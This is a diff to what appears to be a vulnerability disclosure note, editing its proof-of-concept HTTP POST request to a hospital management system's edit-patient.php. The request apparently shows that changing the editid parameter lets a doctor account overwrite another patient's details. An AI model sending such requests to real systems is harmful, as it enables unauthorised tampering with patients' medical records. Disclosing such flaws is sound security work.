@@ -9,7 +9,7 @@
 
 ## -----------------------------------------------POC-------------------------------------------------------------------
 ```
-POST /hospital/hms/doctor/edit-patient.php?editid=2(CHANGE HERE) HTTP/1.1
+POST /hospital/hms/doctor/edit-patient.php?editid=2 HTTP/1.1
 ...
 
 patname=user1p&patcontact=111112&patemail=user1p%40test.com(CHANGE HERE)&gender=Male&pataddress=bbb&patage=20&medhis=0&submit=
